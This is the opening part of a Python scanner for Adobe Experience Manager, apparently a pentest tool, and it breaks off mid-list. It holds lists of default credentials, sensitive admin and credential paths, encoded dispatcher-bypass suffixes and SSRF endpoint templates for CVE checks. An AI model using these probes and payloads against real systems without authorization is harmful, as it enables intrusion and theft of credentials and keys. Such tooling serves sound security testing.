#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
aem_hunter.py - Adobe Experience Manager Unauthenticated Security Scanner
==========================================================================

A single-file scanner that hits an AEM instance UNAUTHENTICATED and runs every
well-known check in depth. No cookies, no auth — just give it a URL.

Covers (exhaustive, all unauthenticated):
  - Fingerprinting (Author vs Publish, version hints, Sling/Day/CQ headers)
  - Default credentials (basic auth probe of admin surfaces)
  - Exposed admin consoles (Felix /system/console/*, CRX DE / Package Manager /
    Explorer, Groovy Console, WebDAV, Apache Sling Web Console, JMX, threads,
    memoryusage, logs, profiler, healthcheck, events, services, components,
    configMgr, depfinder, scr, status-*)
  - QueryBuilder API exposure + selector / extension bypasses + query injection
  - Dispatcher bypass fuzzing (.css / .js / .png / .html selector tricks,
    `;` semicolon abuse, `..;/` Jetty normalization, %2f / %00 / %0a quirks,
    double-slash, URL-encoding tricks, traversal+suffix combos)
  - Sling info disclosure (.json, .1.json, .tidy.json, .infinity.json,
    .harray.4.json on /content, /etc, /apps, /var, /home, /libs, /tmp,
    /conf, /content/dam, /content/projects, /content/we-retail, /content/geometrixx)
  - JCR enumeration (users.1.json, groups.1.json, currentuser.json,
    authorizables, group memberships, rep:password hash dump)
  - Cloud services / connector credential leakage (/etc/cloudservices.*)
  - SSRF endpoints (linkchecker, SalesforceSecretServlet [CVE-2018-5006],
    ReportingServicesServlet [CVE-2018-12809], external resource fetchers,
    OpenSocial proxy, autoprovisioning, SiteCatalyst, DAM cloud proxy)
  - 2025 CVE wave: CVE-2025-54253 (OGNL RCE Forms JEE), CVE-2025-54254 (XXE),
    CVE-2025-49533 (deserialization)
  - 2024 CVE wave: CVE-2024-43712, CVE-2024-43711, CVE-2024-32813,
    CVE-2024-32812, CVE-2024-32811, CVE-2024-26031, CVE-2024-26030,
    CVE-2024-20767, CVE-2024-20736
  - 2023 CVE wave: CVE-2023-22368, CVE-2023-22366, CVE-2023-22365
  - 2022 CVE wave: CVE-2022-30679, CVE-2022-30680, CVE-2022-23710
  - 2021 CVE wave: CVE-2021-44519, CVE-2021-43762
  - 2019 CVE wave: CVE-2019-8088, CVE-2019-8087, CVE-2019-8086
  - 2018 CVE wave: CVE-2018-5006, CVE-2018-12809, CVE-2018-19298, CVE-2018-19297
  - 2017: CVE-2017-3104 (SSTI)
  - 2016: CVE-2016-1027, CVE-2016-7882 (WCMDebugFilter reflected XSS)
  - Sling POST servlet abuse (anonymous node creation, anonymous user creation,
    :operation primitives)
  - Replication agent transport credential disclosure
  - Source / clientlib disclosure tricks (.source, .servlet selectors)
  - Reflected XSS via exposed SWF files (0ang3el list)
  - Reflected XSS via known servlet sinks (ChildrenList, CRXDE prefs,
    WCMSuggestions, ContentFinder, MergeMetadata)
  - Open redirect probes (login redirect, resource redirect, AEM-specific)
  - GraphQL endpoint enumeration
  - Headers / robots / sitemap / well-known surface
  - WebDAV PROPFIND XXE + method enumeration
  - Three-channel reporting: live console, JSON, HTML

Usage is dead simple:
    python3 aem_hunter.py                            # prompts for the URL
    python3 aem_hunter.py https://aem.example.com
    python3 aem_hunter.py -u TARGET --proxy http://127.0.0.1:8080
    python3 aem_hunter.py -u TARGET --aggressive    # bigger fuzz set
    python3 aem_hunter.py -u TARGET --http2         # for HTTP/2-only targets

Every run writes its own JSON + HTML report.

Author: pentest use only.  Authorization required.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import datetime as dt
import html as html_mod
import json
import os
import random
import re
import string
import sys
import textwrap
import threading
import time
import urllib.parse as up
from dataclasses import dataclass, field, asdict
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple, Union

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:  # pragma: no cover
    sys.stderr.write("[!] Missing dependency 'requests'.\n")
    sys.stderr.write("    Install with: pip install requests urllib3\n")
    sys.exit(1)

# Optional: httpx with HTTP/2 support. Many enterprise targets (behind a CDN /
# WAF / LB) only speak HTTP/2, which `requests` cannot — those connections die
# with UnknownProtocol('HTTP/2'). If httpx[http2] is installed, --http2 routes
# all traffic through it so the tool works WITHOUT a downgrading proxy (Burp).
try:
    import httpx
    _HAS_HTTPX = True
except ImportError:
    _HAS_HTTPX = False


VERSION = "1.0.0"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
BANNER = r"""
    _    _____ __  __   _   _ _   _ _   _ _____ _____ ____
   / \  | ____|  \/  | | | | | | | | \ | |_   _| ____|  _ \
  / _ \ |  _| | |\/| | | |_| | | | |  \| | | | |  _| | |_) |
 / ___ \| |___| |  | | |  _  | |_| | |\  | | | | |___|  _ <
/_/   \_\_____|_|  |_| |_| |_|\___/|_| \_| |_| |_____|_| \_\

       Adobe Experience Manager  -  Unauthenticated Audit Scanner  v{ver}
       Authorized testing only. Don't be a jerk.
"""

# ---------------------------------------------------------------------------
# Severity & metadata constants
# ---------------------------------------------------------------------------
SEV_INFO = "INFO"
SEV_LOW = "LOW"
SEV_MEDIUM = "MEDIUM"
SEV_HIGH = "HIGH"
SEV_CRITICAL = "CRITICAL"

SEV_ORDER = {SEV_CRITICAL: 5, SEV_HIGH: 4, SEV_MEDIUM: 3, SEV_LOW: 2, SEV_INFO: 1}

CAT_FINGERPRINT = "Fingerprinting"
CAT_AUTH = "Authentication"
CAT_EXPOSURE = "Exposed Endpoint"
CAT_DISPATCHER = "Dispatcher Bypass"
CAT_DISCLOSURE = "Information Disclosure"
CAT_SSRF = "SSRF"
CAT_RCE = "Remote Code Execution"
CAT_XXE = "XXE"
CAT_XSS = "XSS"
CAT_JCR = "JCR / Sling"
CAT_CVE = "Known CVE"
CAT_MISCONFIG = "Misconfiguration"
CAT_ROLE = "Authenticated Role"

# ---------------------------------------------------------------------------
# Default credentials — well-known AEM accounts (admin surfaces only).
# Order matters: highest-value targets first.
# ---------------------------------------------------------------------------
DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", ""),
    ("author", "author"),
    ("anonymous", "anonymous"),
    ("replication-receiver", "replication-receiver"),
    ("vgnadmin", "vgnadmin"),
    ("administrator", "administrator"),
    ("audit", "audit"),
    ("grios", "password"),
    # Geometrixx sample-content users (AEM 5.x / 6.0 / 6.1 demo)
    ("aparker@geometrixx.info", "aparker"),
    ("jdoe@geometrixx.info", "jdoe"),
    ("james.devore@spambob.com", "password"),
    ("matt.monroe@mailinator.com", "password"),
    ("aaron.mcdonald@mailinator.com", "password"),
    ("jason.werner@dodgit.com", "password"),
    # AEM Sites / DAM / Forms internal accounts that ship empty by default
    ("dam-creators", "dam-creators"),
    ("forms-manager", "forms-manager"),
    ("workflow-administrators", "workflow-administrators"),
]

# Surfaces that respond with HTTP 401 (WWW-Authenticate Basic) for an
# unauthenticated request and HTTP 200 once valid credentials are sent.
# Picking surfaces that don't allow anonymous so a 200 is a strong positive.
AUTH_PROBE_PATHS = [
    "/crx/de/index.jsp",
    "/system/console/bundles",
    "/crx/packmgr/index.jsp",
    "/libs/granite/core/content/login.html/j_security_check",
]

# ---------------------------------------------------------------------------
# Sensitive paths to probe unauthenticated.
# Each entry: (path, severity_if_exposed, category, label, signature_regex|None)
# A signature_regex of None means 200 OK is sufficient.
# ---------------------------------------------------------------------------
# NOTE: admin consoles (Felix, CRXDE, Package Manager, Groovy, CRX Explorer)
# are NOT listed here. On an author instance they return their HTML/JSP shell
# (HTTP 200) to *everyone* — the shell is harmless, real access is gated behind
# login. Flagging the shell as CRITICAL is a false positive. Those surfaces are
# instead verified functionally in check_consoles(), which only fires when an
# actual privileged operation (bundle list, package list, JCR node read)
# succeeds. This list holds DATA endpoints, which are only flagged when they
# return real JCR/JSON content and are NOT a login/auth-wall page.
SENSITIVE_ENDPOINTS: List[Tuple[str, str, str, str, Optional[str]]] = [
    # --- High-value config / credential trees (only if real JCR JSON comes back) ---
    ("/etc/replication.json",                      SEV_HIGH,   CAT_DISCLOSURE, "Replication agents config readable",          r"(transportUri|agentClass|jcr:primaryType)"),
    ("/etc/replication/agents.author.json",        SEV_HIGH,   CAT_DISCLOSURE, "Author replication agents readable",          r"(transportUri|jcr:primaryType)"),
    ("/etc/replication/agents.publish.json",       SEV_HIGH,   CAT_DISCLOSURE, "Publish replication agents readable",         r"(transportUri|jcr:primaryType)"),
    ("/etc/replication/agents.author.infinity.json", SEV_CRITICAL, CAT_DISCLOSURE, "Author replication infinity (creds)",     r"(transportUri|transportPassword|transportUser)"),
    ("/etc/replication/agents.publish.infinity.json", SEV_CRITICAL, CAT_DISCLOSURE, "Publish replication infinity (creds)",   r"(transportUri|transportPassword|transportUser)"),
    ("/etc/cloudservices.infinity.json",           SEV_HIGH,   CAT_DISCLOSURE, "Cloud services tree readable",                r"jcr:primaryType"),
    ("/etc/cloudservices.json",                    SEV_HIGH,   CAT_DISCLOSURE, "Cloud services config readable",              r"jcr:primaryType"),
    ("/etc/key.json",                              SEV_HIGH,   CAT_DISCLOSURE, "Crypto key node readable",                    r"jcr:primaryType"),
    ("/etc/key.infinity.json",                     SEV_CRITICAL, CAT_DISCLOSURE, "Master crypto key (infinity) readable",     r"jcr:primaryType"),
    ("/etc/truststore.json",                       SEV_HIGH,   CAT_DISCLOSURE, "Truststore node readable",                    r"jcr:primaryType"),
    ("/etc/notification.json",                     SEV_MEDIUM, CAT_DISCLOSURE, "Notification config readable",                r"jcr:primaryType"),
    # --- User / group enumeration (need real authorizable content) ---
    ("/home/users.1.json",                         SEV_HIGH,   CAT_DISCLOSURE, "User tree readable",                          r"(rep:User|rep:authorizableId|rep:principalName)"),
    ("/home/users.infinity.json",                  SEV_CRITICAL, CAT_DISCLOSURE, "User tree infinity readable",               r"(rep:User|rep:authorizableId|rep:principalName)"),
    ("/home/groups.1.json",                        SEV_HIGH,   CAT_DISCLOSURE, "Group tree readable",                         r"(rep:Group|rep:principalName)"),
    ("/home/groups.infinity.json",                 SEV_CRITICAL, CAT_DISCLOSURE, "Group tree infinity readable",              r"(rep:Group|rep:principalName)"),
    ("/libs/cq/security/content/admin/groups.json",SEV_MEDIUM, CAT_DISCLOSURE, "Group admin JSON readable",                   r"(authorizableId|administrators)"),
    ("/libs/granite/security/currentuser.json",    SEV_INFO,   CAT_DISCLOSURE, "currentuser.json reachable",                  r"(home|authorizableId|userID)"),
    ("/libs/granite/security/post/authorizables.json", SEV_MEDIUM, CAT_DISCLOSURE, "Authorizables service reachable",         r"(authorizableId|\"users\")"),
    ("/libs/granite/security/userinfo.json",       SEV_LOW,    CAT_DISCLOSURE, "User info servlet reachable",                 None),
    # --- Packages / audit ---
    ("/etc/packages.json",                         SEV_MEDIUM, CAT_DISCLOSURE, "Packages tree readable",                      r"jcr:primaryType"),
    ("/etc/packages.infinity.json",                SEV_HIGH,   CAT_DISCLOSURE, "Packages tree infinity readable",             r"jcr:primaryType"),
    ("/var/audit.json",                            SEV_MEDIUM, CAT_DISCLOSURE, "Audit log tree readable",                     r"jcr:primaryType"),
    ("/var/audit.infinity.json",                   SEV_HIGH,   CAT_DISCLOSURE, "Audit log infinity readable",                 r"jcr:primaryType"),
    ("/var/eventing.json",                         SEV_MEDIUM, CAT_DISCLOSURE, "Eventing tree readable",                      r"jcr:primaryType"),
    ("/var/clientlibs.json",                       SEV_LOW,    CAT_DISCLOSURE, "Clientlibs cache tree readable",              r"jcr:primaryType"),
    ("/var/workflow.json",                         SEV_MEDIUM, CAT_DISCLOSURE, "Workflow tree readable",                      r"jcr:primaryType"),
    ("/var/dam.json",                              SEV_LOW,    CAT_DISCLOSURE, "DAM var tree readable",                       r"jcr:primaryType"),
    # --- SSRF surface (reachability only; SSRF module confirms exploitability) ---
    ("/libs/wcm/resources/linkchecker.json",       SEV_LOW,    CAT_SSRF,       "External Link Checker reachable",             None),
    # --- Forms JEE admin (CVE module confirms /adminui/debug separately) ---
    ("/adminui",                                   SEV_MEDIUM, CAT_EXPOSURE,   "AEM Forms JEE admin UI reachable",            None),
    ("/lc",                                        SEV_MEDIUM, CAT_EXPOSURE,   "AEM LiveCycle UI reachable",                  None),
    # --- GraphQL ---
    ("/content/graphql/global/endpoint.json",      SEV_LOW,    CAT_EXPOSURE,   "AEM GraphQL endpoint reachable",              None),
    ("/content/cq:graphql/global/endpoint.json",   SEV_LOW,    CAT_EXPOSURE,   "AEM cq:graphql endpoint reachable",           None),
    # --- Default-readable framework trees: INFO only (common, low value) ---
    ("/etc.1.json",                                SEV_INFO,   CAT_DISCLOSURE, "/etc tree readable",                          r"jcr:primaryType"),
    ("/conf.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/conf tree readable",                         r"jcr:primaryType"),
    ("/apps.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/apps tree readable",                         r"jcr:primaryType"),
    # --- Granite / WCM operations consoles (data endpoints) ---
    ("/libs/granite/operations/content/maintenance.html", SEV_MEDIUM, CAT_EXPOSURE, "Maintenance console reachable",          None),
    ("/libs/granite/operations/content/healthreports.html", SEV_MEDIUM, CAT_EXPOSURE, "Healthreports console reachable",      None),
    ("/libs/granite/operations/content/diagnosistools.html", SEV_MEDIUM, CAT_EXPOSURE, "Diagnosis tools console reachable",   None),
    ("/libs/granite/operations/content/replicationqueue.html", SEV_HIGH, CAT_EXPOSURE, "Replication queue console reachable", None),
    ("/libs/granite/operations/content/systemoverview.html", SEV_MEDIUM, CAT_EXPOSURE, "System overview console reachable",   None),
    ("/libs/granite/operations/content/monitoring.html", SEV_LOW, CAT_EXPOSURE, "Granite monitoring console reachable",       None),
    # --- AEM-as-Cloud-Service paths ---
    ("/etc/aem.json",                              SEV_LOW,    CAT_DISCLOSURE, "/etc/aem readable",                           r"jcr:primaryType"),
    # --- Sling internals ---
    ("/system/sling/info.sessionInfo.json",        SEV_MEDIUM, CAT_DISCLOSURE, "Sling session info exposed",                  r"(userID|workspace)"),
    # --- Default sample-content trees often forgotten in prod ---
    ("/content/we-retail.1.json",                  SEV_LOW,    CAT_DISCLOSURE, "We.Retail sample content present",            r"jcr:primaryType"),
    ("/content/geometrixx.1.json",                 SEV_LOW,    CAT_DISCLOSURE, "Geometrixx sample content present",           r"jcr:primaryType"),
    ("/content/geometrixx-outdoors.1.json",        SEV_LOW,    CAT_DISCLOSURE, "Geometrixx-Outdoors sample content present",  r"jcr:primaryType"),
]

# Felix / OSGi console surfaces — high-value enumeration data when reachable.
# Each entry: (path, severity_if_open, label, signature_regex_or_None).
OSGI_CONSOLE_PATHS: List[Tuple[str, str, str, Optional[str]]] = [
    ("/system/console",                          SEV_CRITICAL, "Felix OSGi console root",       r"Apache Felix"),
    ("/system/console/bundles",                  SEV_CRITICAL, "Felix bundles console",         r"(symbolicName|Bundle Repository)"),
    ("/system/console/bundles.json",             SEV_CRITICAL, "Felix bundles.json inventory",  r"(symbolicName|stateRaw)"),
    ("/system/console/components",               SEV_CRITICAL, "Felix components console",      r"(Component|description)"),
    ("/system/console/services",                 SEV_HIGH,     "Felix services console",        r"(service\.id|objectClass)"),
    ("/system/console/configMgr",                SEV_CRITICAL, "Felix ConfigMgr console",       r"(Configurations|configuration)"),
    ("/system/console/configuration",            SEV_HIGH,     "Felix configuration console",   r"(Configurations|configuration)"),
    ("/system/console/depfinder",                SEV_HIGH,     "Felix Dependency Finder",       r"(Dependency|Finder)"),
    ("/system/console/scr",                      SEV_HIGH,     "Felix Service Component Runtime", r"(Component Descriptions|scr)"),
    ("/system/console/jmx",                      SEV_CRITICAL, "Felix JMX console",             r"(JMX|MBean)"),
    ("/system/console/threads",                  SEV_HIGH,     "Felix Threads console",         r"(Thread Information|thread group)"),
    ("/system/console/memoryusage",              SEV_MEDIUM,   "Felix MemoryUsage console",     r"(Memory|heap)"),
    ("/system/console/profiler",                 SEV_HIGH,     "Felix Profiler console",        r"(Profiler|profiling)"),
    ("/system/console/logs",                     SEV_HIGH,     "Felix Logs console",            r"(Log Files|log\.)"),
    ("/system/console/slinglogs",                SEV_HIGH,     "Felix Sling Logs console",      r"(Log Support|sling)"),
    ("/system/console/events",                   SEV_MEDIUM,   "Felix Events console",          r"(OSGi Events|EventAdmin)"),
    ("/system/console/slingevent",               SEV_MEDIUM,   "Sling Eventing console",        r"(Eventing|EventAdmin)"),
    ("/system/console/healthcheck",              SEV_HIGH,     "Felix HealthCheck console",     r"(Health Check|HealthCheck)"),
    ("/system/console/status-Component",         SEV_MEDIUM,   "Felix Component status dump",   r"Component"),
    ("/system/console/status-jcrresolver",       SEV_HIGH,     "Felix JCR Resolver status",     r"(JcrResourceResolver|Resource Resolver)"),
    ("/system/console/status-slingsettings",     SEV_HIGH,     "Sling Settings status",         r"(Sling Settings|sling\.id)"),
    ("/system/console/status-adapters",          SEV_LOW,      "Felix Adapters status",         r"Adapter"),
    ("/system/console/jcrresolver",              SEV_HIGH,     "JCR Resource Resolver console", r"(Resource Resolver|JcrResource)"),
    ("/system/console/slingauth",                SEV_HIGH,     "Sling Authentication console",  r"(Auth Service|sling\.auth)"),
    ("/system/console/httpservice",              SEV_MEDIUM,   "HTTP Service console",          r"(HTTP Service|Servlet)"),
    ("/system/console/license",                  SEV_LOW,      "Felix License console",         r"(License|software)"),
    ("/system/console/vmstat",                   SEV_LOW,      "Felix VMStat console",          r"(JVM|vmstat)"),
    # CRX/Day legacy admin
    ("/crx/de/index.jsp",                        SEV_CRITICAL, "CRXDE Lite",                    r"CRXDE"),
    ("/crx/explorer/index.jsp",                  SEV_CRITICAL, "CRX Explorer",                  r"(CRX Explorer|Repository)"),
    ("/crx/explorer/login.jsp",                  SEV_HIGH,     "CRX Explorer login page",       r"(login|CRX)"),
    ("/crx/explorer/nodetypes/index.jsp",        SEV_LOW,      "CRX Explorer node types",       r"(node types|Registered Node Types)"),
    ("/crx/packmgr/index.jsp",                   SEV_CRITICAL, "CRX Package Manager UI",        r"(Package Manager|Packages)"),
    ("/crx/packmgr/service/.json",               SEV_HIGH,     "CRX Package Manager service",   None),
    ("/crx/packmgr/service.jsp",                 SEV_HIGH,     "CRX Package Manager service.jsp", None),
    ("/crx/packmgr/list.jsp",                    SEV_HIGH,     "CRX Package Manager list.jsp",  None),
    ("/crx/packageshare/index.jsp",              SEV_MEDIUM,   "CRX Package Share UI",          r"(Package Share|Adobe Repository)"),
    ("/crx/repository/crx.default",              SEV_HIGH,     "CRX repository default endpoint", None),
    ("/crx/server/crx.default",                  SEV_CRITICAL, "CRX WebDAV server endpoint",    None),
    ("/crx/server",                              SEV_CRITICAL, "CRX server root",               None),
    # Groovy / ACS
    ("/bin/groovyconsole",                       SEV_CRITICAL, "Groovy Console UI",             r"Groovy"),
    ("/bin/groovyconsole.html",                  SEV_CRITICAL, "Groovy Console (html)",         r"Groovy"),
    ("/etc/groovyconsole.html",                  SEV_CRITICAL, "Groovy Console (etc path)",     r"Groovy"),
    # Misc consoles
    ("/miscadmin",                               SEV_LOW,      "miscadmin console",             r"AEM Tools"),
    ("/welcome",                                 SEV_INFO,     "Welcome page",                  r"(AEM|Granite|Adobe)"),
    ("/etc/importers/bulkeditor.html",           SEV_LOW,      "BulkEditor console",            r"BulkEditor"),
    ("/libs/granite/security/content/useradmin.html", SEV_MEDIUM, "Security User Admin console", r"(Users|Security)"),
    ("/libs/granite/offloading/content/view.html", SEV_LOW, "Offloading Browser",               r"Offloading"),
    ("/libs/cq/ui/content/dumplibs.html",        SEV_LOW,      "ClientLibraries dump (dumplibs)", r"Client Libraries"),
    ("/libs/granite/ui/content/dumplibs.test.html", SEV_LOW,   "ClientLibraries test output",    r"Client Libraries Test"),
    ("/libs/cq/contentinsight/content/proxy.json", SEV_MEDIUM, "ContentInsight proxy reachable", None),
    # CSRF token disclosure
    ("/libs/granite/csrf/token.json",            SEV_LOW,      "CSRF token endpoint reachable", r"token"),
]

# ---------------------------------------------------------------------------
# Sling selector / extension permutations used as dispatcher bypass payloads.
# The idea: Dispatcher checks the URI string against a regex allow-list. If
# the suffix looks like an allowed static asset (.css, .js, .png, etc.) it is
# forwarded to the backend. Sling normalizes selectors and extensions during
# resource resolution and ignores the trailing ".css" — so the JSON / debug
# servlet ends up serving its real response.
# ---------------------------------------------------------------------------
BYPASS_EXTENSIONS = [".css", ".js", ".png", ".html", ".ico", ".gif", ".jpg", ".svg", ".woff", ".woff2"]
# Curated, high-signal suffix set (the variants that actually work against real
# AEM dispatchers, per WithSecure / Assetnote / 0ang3el research). Default keeps
# fuzz lean (~10 suffixes); --aggressive switches in the full set.
BYPASS_SUFFIXES: List[str] = [
    ".css", ".js", ".png", ".html", ".ico",   # allowed-extension allow-list bypass
    ";%0aa.css", ";%0aa.html",                 # CRLF/newline + allowed extension
    "/a.css", "/a.html",                       # path-suffix normalization
    ".servlet.css",                            # servlet selector + allowed extension
]
# Extended dispatcher bypass suffix set — every well-known evasion pattern from
# WithSecure, Assetnote, 0ang3el, HackTricks, and public bug-bounty reports.
BYPASS_SUFFIXES_AGGRESSIVE: List[str] = BYPASS_SUFFIXES + [
    ".gif", ".jpg", ".svg", ".woff", ".woff2",
    ";.css", ";.html", ";.js", ";.png",
    ";%0aa.js", ";%0aa.png", ";%0aa.ico", ";%0aa.gif",
    "/a.js", "/a.png", "/a.ico", "/a.gif",
    "///a.css", "///a.html",
    "..;/a.css", "..;/a.html",                 # Jetty normalization
    "..%2f..%2fa.css",
    "%2f..%2fa.css", "%2f..%2fa.html",
    "%00.css", "%00.html", "%00.json",
    "%0a.css", "%0a.html",
    "%20.css", "%20.html",
    "%23.css", "%23.html",                     # fragment fragment-bypass
    "%2e%2e.css", "%2e%2e.html",
    "%2f%2f.css",
    ".servlet.css", ".servlet.html", ".servlet.json",
    ".json/a.css", ".json/a.html",
    ".infinity.json/a.css", ".infinity.json/a.html",
    ".1.json/a.css", ".1.json/a.html",
    ".childrenlist.html",
    ";/a.css",
    "?.css", "?a=b.css",
    "/.ico", "/.css", "/.html",
    "%2fa.css", "%2fa.html",
    "..\\a.css", "..\\a.html",
    "%5c..%5ca.css",
]

# Targets to fuzz with dispatcher bypass suffixes.
# We pick endpoints whose unauthenticated baseline is normally 403/404 and
# whose breach is high impact.
DISPATCHER_TARGETS: List[Tuple[str, str, str]] = [
    ("/bin/querybuilder.json?path=/&p.hits=full&p.limit=1", "QueryBuilder API",       SEV_HIGH),
    ("/bin/querybuilder.json?path=/etc&p.hits=full&p.limit=1", "QueryBuilder API (etc)", SEV_HIGH),
    ("/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1", "QueryBuilder API (users)", SEV_HIGH),
    ("/bin/querybuilder.json?path=/etc/cloudservices&p.hits=full&p.limit=1", "QueryBuilder (cloudservices)", SEV_CRITICAL),
    ("/bin/querybuilder.json?type=rep:User&p.hits=full&p.limit=1", "QueryBuilder (rep:User)", SEV_HIGH),
    ("/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1", "QueryBuilder feed",   SEV_HIGH),
    ("/bin/querybuilder.json.servlet", "QueryBuilder servlet path",                    SEV_HIGH),
    ("/bin/wcm/search/gql.json?query=type:base%20limit:..1", "GQL search servlet",     SEV_HIGH),
    ("/bin/wcm/contentfinder/connector/suggestions.json", "ContentFinder suggestions", SEV_MEDIUM),
    ("/system/console", "Felix OSGi console",                                          SEV_CRITICAL),
    ("/system/console/bundles", "Felix bundles console",                               SEV_CRITICAL),
    ("/system/console/bundles.json", "Felix bundles.json",                             SEV_CRITICAL),
    ("/system/console/components", "Felix components",                                 SEV_CRITICAL),
    ("/system/console/configMgr", "Felix ConfigMgr",                                   SEV_CRITICAL),
    ("/system/console/services", "Felix services",                                     SEV_HIGH),
    ("/system/console/jmx", "Felix JMX console",                                       SEV_CRITICAL),
    ("/system/console/scr", "Felix SCR",                                               SEV_HIGH),
    ("/system/console/threads", "Felix Threads",                                       SEV_HIGH),
    ("/system/console/memoryusage", "Felix MemoryUsage",                               SEV_MEDIUM),
    ("/system/console/profiler", "Felix Profiler",                                     SEV_HIGH),
    ("/system/console/logs", "Felix Logs",                                             SEV_HIGH),
    ("/system/console/depfinder", "Felix DepFinder",                                   SEV_HIGH),
    ("/system/console/status-slingsettings", "Sling Settings",                         SEV_HIGH),
    ("/system/console/status-jcrresolver", "JCR Resolver status",                      SEV_HIGH),
    ("/system/console/jcrresolver", "JCR Resolver",                                    SEV_HIGH),
    ("/system/console/slingauth", "Sling Auth",                                        SEV_HIGH),
    ("/system/console/httpservice", "HTTP Service",                                    SEV_MEDIUM),
    ("/system/console/healthcheck", "Felix HealthCheck",                               SEV_HIGH),
    ("/system/console/events", "Felix Events",                                         SEV_MEDIUM),
    ("/system/console/slingevent", "Sling Events",                                     SEV_MEDIUM),
    ("/crx/de/index.jsp", "CRXDE Lite",                                                SEV_CRITICAL),
    ("/crx/explorer/index.jsp", "CRX Explorer",                                        SEV_CRITICAL),
    ("/crx/packmgr/index.jsp", "CRX Package Manager",                                  SEV_CRITICAL),
    ("/crx/packmgr/service/.json", "CRX Package Manager service",                      SEV_HIGH),
    ("/crx/packmgr/service.jsp", "CRX Package Manager service.jsp",                    SEV_HIGH),
    ("/crx/packmgr/list.jsp", "CRX Package Manager list.jsp",                          SEV_HIGH),
    ("/crx/packageshare/index.jsp", "CRX Package Share",                               SEV_MEDIUM),
    ("/crx/server", "CRX server root",                                                 SEV_CRITICAL),
    ("/crx/server/crx.default/jcr:root.1.json", "CRX WebDAV repo read",                SEV_CRITICAL),
    ("/bin/groovyconsole", "Groovy Console",                                           SEV_CRITICAL),
    ("/bin/groovyconsole.html", "Groovy Console (html)",                               SEV_CRITICAL),
    ("/etc/groovyconsole.html", "Groovy Console (etc)",                                SEV_CRITICAL),
    ("/etc/replication.json", "Replication agents",                                    SEV_HIGH),
    ("/etc/replication.infinity.json", "Replication infinity",                         SEV_CRITICAL),
    ("/etc/packages.json", "Packages listing",                                         SEV_MEDIUM),
    ("/etc/cloudservices.infinity.json", "Cloud services tree",                        SEV_CRITICAL),
    ("/etc/key.infinity.json", "Master crypto key",                                    SEV_CRITICAL),
    ("/home/users.1.json", "Users listing",                                            SEV_HIGH),
    ("/home/users.infinity.json", "Users infinity",                                    SEV_CRITICAL),
    ("/home/groups.1.json", "Groups listing",                                          SEV_HIGH),
    ("/home/groups.infinity.json", "Groups infinity",                                  SEV_CRITICAL),
    ("/libs/granite/security/userinfo.json", "User info",                              SEV_LOW),
    ("/libs/granite/security/post/authorizables.json", "Authorizables service",        SEV_HIGH),
    ("/libs/cq/security/content/admin/groups.json", "Group admin JSON",                SEV_HIGH),
    ("/var/audit.json", "Audit log",                                                   SEV_MEDIUM),
    ("/var/eventing.json", "Eventing log",                                             SEV_MEDIUM),
    ("/bin/msm/audit.json", "MSM Audit servlet",                                       SEV_MEDIUM),
    ("/bin/crxde/logs", "CRXDE logs tail",                                             SEV_MEDIUM),
    ("/etc/reports/diskusage.html", "Disk Usage report",                               SEV_LOW),
    ("/system/sling/loginstatus.json", "LoginStatus servlet",                          SEV_LOW),
    ("/adminui/debug", "AEM Forms JEE OGNL debug (CVE-2025-54253)",                    SEV_CRITICAL),
]

# Roots fuzzed with Sling info-disclosure selectors (.json, .1.json, .infinity.json, ...)
SLING_INFO_ROOTS = [
    "/", "/content", "/etc", "/apps", "/libs", "/var", "/home", "/tmp", "/conf",
    "/content/dam", "/content/projects", "/content/we-retail", "/content/geometrixx",
    "/content/geometrixx-outdoors", "/content/wknd", "/content/usergenerated",
    "/content/forms", "/content/launches", "/content/experience-fragments",
    "/content/campaigns", "/content/communities",
    "/etc/cloudservices", "/etc/replication", "/etc/key", "/etc/packages",
    "/etc/clientlibs", "/etc/designs", "/etc/notification", "/etc/truststore",
    "/etc/segmentation", "/etc/scaffolding", "/etc/workflow", "/etc/tags",
    "/etc/groovyconsole", "/etc/aem",
    "/home/users", "/home/groups",
    "/var/audit", "/var/clientlibs", "/var/dam", "/var/eventing", "/var/workflow",
    "/var/replication",
    "/conf/global", "/conf/we-retail",
    "/libs/granite", "/libs/cq", "/libs/wcm", "/libs/dam", "/libs/sling",
    "/libs/foundation",
]
SLING_INFO_SELECTORS = [
    ".json", ".1.json", ".2.json", ".4.json", ".tidy.json", ".infinity.json",
    ".tidy.infinity.json", ".tidy.-1.json", ".harray.4.json", ".tidy.harray.4.json",
    ".children.json", ".feed.xml", ".xml", ".-1.json", ".5.json", ".6.json",
    ".harray.infinity.json",
]

# Endpoints we attempt SSRF against. Each entry is (template, param, label, CVE).
SSRF_TARGETS: List[Tuple[str, str, str, Optional[str]]] = [
    ("/libs/wcm/resources/linkchecker.json?path={u}",                      "path",         "linkchecker", None),
    ("/libs/wcm/resources/linkchecker.json?url={u}",                       "url",          "linkchecker (url param)", None),
    ("/etc/linkchecker.html?url={u}",                                      "url",          "linkchecker HTML", None),
    ("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url={u}", "instance_url", "SalesforceSecretServlet SSRF (CVE-2018-5006)", "CVE-2018-5006"),
    ("/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url={u}&customer_key=z&customer_secret=z&redirect_uri=x&code=e", "authorization_url", "Salesforce authorize SSRF", "CVE-2018-5006"),
    ("/libs/dam/cloud/proxy.json?host={u}",                                "host",         "DAM cloud proxy", None),
    ("/libs/dam/cloud/proxy.json?endpoint={u}",                            "endpoint",     "DAM cloud proxy (endpoint)", None),
    ("/libs/opensocial/proxy?url={u}",                                     "url",          "OpenSocial proxy", None),
    ("/libs/opensocial/proxy?container=default&url={u}",                   "url",          "OpenSocial proxy (default container)", None),
    ("/libs/opensocial/makeRequest?url={u}",                               "url",          "OpenSocial makeRequest", None),
